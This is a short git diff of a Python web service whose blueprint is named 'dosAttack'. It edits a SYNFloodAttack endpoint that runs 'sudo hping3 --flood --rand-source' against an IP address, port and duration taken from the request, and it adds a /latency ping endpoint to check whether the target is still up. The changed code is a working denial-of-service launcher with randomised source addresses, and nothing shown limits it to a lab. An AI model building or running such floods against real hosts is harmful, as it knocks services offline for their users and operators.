@@ -14,7 +14,10 @@ def SYNFloodAttack():
     attackType = data["attackType"]
     duration = int(data["duration"])
 
-    dosCommand = subprocess.Popen(['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
+    dosCommand = subprocess.Popen(
+        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
+        stdout=subprocess.PIPE,
+        text=True)
     time.sleep(duration) # carry out attack for specified duration
 
     try:
@@ -23,7 +26,20 @@ def SYNFloodAttack():
         print('Timeout occured')
     
     dosCommand.kill()
+    return ""
 
-    return "DoS Complete"
+@dosAttack.post("/latency")
+def checkLatency():
+    data = request.get_json()
+    ipAddress = data["ipAddress"]
 
+    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
+    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish
 
+    lines = output.splitlines()
+    line = lines[1]
+
+    if "time" in line:
+        return '[PING SUCCESS] ' + line
+    else:
+        return '[PING FAILED] ' + line
